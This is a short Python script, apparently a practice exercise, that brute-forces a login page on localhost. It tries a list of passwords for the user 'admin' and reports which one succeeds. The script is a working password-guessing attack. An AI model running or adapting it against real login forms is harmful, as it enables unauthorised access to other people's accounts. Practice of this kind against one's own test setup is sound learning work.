import requests
import time

url = "http://localhost/pycyber1/login.php"

username = "admin"
passwords = ["test","hello","awdwad","21dlska","123012","210131"    ,"123456","213123"]

Error = "Error data"
for p in passwords:
    data = {
        "username":username,
        "password":p
    }
    response = requests.post(url,data)
    
    if Error in response.text:
        print(f"[-] Error data : {username} | {p}")
    else:
        print(f"[+] Succesful : {username} | {p}")
    time.sleep(1)